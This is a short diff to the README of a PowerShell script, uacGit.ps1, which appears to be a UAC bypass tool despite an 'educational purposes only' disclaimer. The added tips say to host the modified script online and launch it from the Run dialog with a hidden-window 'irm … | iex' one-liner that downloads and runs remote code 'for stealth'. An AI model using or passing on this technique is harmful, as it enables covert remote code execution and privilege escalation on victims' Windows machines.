@@ -35,3 +35,8 @@ This script and method are shared for educational purposes only. Misuse of this 
    ```powershell
    .\uacGit.ps1
 
+### Tips:
+1. Host your modified script online.
+2. Utilize Run Dialague Box (Win + R) to execute powershell -C "irm 'LinkToThisScript' | iex" and the "-WindowStyle Hidden" flag for stealth
+
+
